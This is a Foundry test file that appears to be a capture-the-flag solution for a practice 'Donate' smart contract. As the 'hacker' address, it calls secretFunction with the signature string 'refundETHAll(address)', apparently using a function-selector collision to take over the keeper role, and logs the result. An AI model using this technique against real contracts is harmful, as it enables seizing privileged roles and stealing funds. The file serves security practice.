// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/13-Donate/Donate.sol";

contract donateHack is Test {
    Donate donate;
    address keeper = makeAddr("keeper");
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() public {
        vm.prank(owner);
        donate = new Donate(keeper);
    }

    function testhack() public {
        vm.startPrank(hacker);
        // Hack Time
        console.log(address(donate.keeper()));
        donate.secretFunction("refundETHAll(address)");
        console.log(address(donate.keeper()));
        console.log(address(hacker));
    }
}
